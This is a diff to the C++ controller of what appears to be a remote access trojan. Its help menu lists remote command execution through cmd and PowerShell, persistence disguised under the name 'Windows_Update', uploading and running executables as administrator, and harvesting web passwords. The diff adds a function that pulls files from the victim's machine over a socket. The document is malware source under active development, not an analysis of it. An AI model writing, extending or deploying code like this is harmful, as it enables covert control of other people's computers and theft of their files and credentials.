@@ -12,8 +12,8 @@ void Info::list_scripts()
 	std::cout << "[ getTemp\t\t\t\t: Get the location of the temp directory" << std::endl;
 	std::cout << "[ upload \"filename\"\t\t\t: Upload a file in the current directory" << std::endl;
 	std::cout << "[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory" << std::endl;
-	std::cout << "[ download \"filename\"\t\t\t: Download the file's target wanted" << std::endl;
-	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory" << std::endl;
+	std::cout << "[ download \"filename\"\t\t\t: Download the file's target wanted ------NOT IMPLEMENTED" << std::endl;
+	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED" << std::endl;
 	SetColor(14);
 	std::cout << "#------------------------- System commands ------------------------#" << std::endl;
 	SetColor(6);
@@ -22,7 +22,7 @@ void Info::list_scripts()
 	std::cout << "[ kill -n <name>\t\t\t: Kill a process by its name" << std::endl;
 	std::cout << "[ self_persistence <keyname>\t\t: Put a persistence on the payload" << std::endl;
 	std::cout << "[ default name is Windows_Update" << std::endl;
-	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file" << std::endl;
+	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file in the current directory" << std::endl;
 	std::cout << "[ default keyname is Windows_Update" << std::endl;
 	std::cout << "[ cmd <command>\t\t\t\t: Run a command using cmd" << std::endl;
 	std::cout << "[ powershell <command>\t\t\t:Run a command using powershell" << std::endl;
@@ -31,9 +31,9 @@ void Info::list_scripts()
 	SetColor(14);
 	std::cout << "#---------------------------- Exploit ------------------------------#" << std::endl;
 	SetColor(6);
-	std::cout << "[ geo\t\t\t\t: Give the localization of the current session" << std::endl;
-	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session" << std::endl;
-	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen" << std::endl;
+	std::cout << "[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED" << std::endl;
+	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" << std::endl;
+	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED" << std::endl;
 	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
 	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;
 
@@ -91,11 +91,7 @@ void Info::print_help()
 
 }
 
-void Info::getsysinfo(Server* server)
-{
-	std::stringstream ss;
 
-}
 void Info::version(Server* server)
 {
 	SetColor(2);
@@ -143,10 +139,13 @@ void Transfer::uploadToClient(Server* serv1, const std::string filename)
 	{
 		SOCKET cl_sock = serv1->getDefaultClient().sock;
 		const int len = 1024;
-		std::cout << "Sending data ..." << std::endl;
+		print_status("Sending data ..");
 		const int size = getSize(filename);
+
 		std::cout << size << " bytes to send" << std::endl;
-		serv1->send_b(size);
+		print_status(std::to_string(size) + " bytes to send");
+
+		serv1->send_b(size); // SIZE
 		int current_size = 0;
 		char memblock[len] = { 0 };
 		const int rest = size % len;
@@ -177,12 +176,65 @@ void Transfer::uploadToClient(Server* serv1, const std::string filename)
 		}
 		done = 1;
 		t_refresh.join();
-		std::cout << "[*] Done" << std::endl;
+		print_done("Done");
 	}
 	else
 	{
 		serv1->send_b("STOP");
 		std::cout << "[*] Error can\'t open file : " << filename << std::endl;
+	}
+}
+void Transfer::downloadFromClient(Server* serv1, const std::string filename)
+{	
+	char buffer[BUFFER_LEN] = { 0 };
+	SOCKET cl_sock = serv1->getDefaultClient().sock;
+
+	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE
+	const unsigned int size = atoi(buffer);
+	print_status(std::to_string(size) + " bytes to download");
+
+	std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);
+
+	if (file_export)
+	{
+		print_status("File created");
+		print_warning("Starting the download ..");
+		const int len = 1024;
+		int current_size = 0;
+		char memblock[len] = { 0 };
+		const int rest = size % len;
+		Sleep(2000);
+		int pourcentage = 0;
+		bool done = 0;
+		std::thread t_refresh(refresh, &done, 200, &pourcentage);
+
+		while (current_size != size || std::string(memblock) == "STOP")
+		{
+			if (current_size + rest == size)
+			{
+				recv(cl_sock, memblock, rest, 0);
+				file_export.write(memblock, rest);
+				break;
+			}
+			else
+			{
+				recv(cl_sock, memblock, len, 0);
+				file_export.write(memblock, len);
+				current_size += len;
+			}
+			pourcentage = current_size * 100;
+			pourcentage = pourcentage / size;
+
+		}
+		done = 1;
+		t_refresh.join();
+		file_export.close();
+		print_done("Done");
+		
+	}
+	else
+	{
+		print_error("Can't create the file : "+filename);
 	}
 }
 
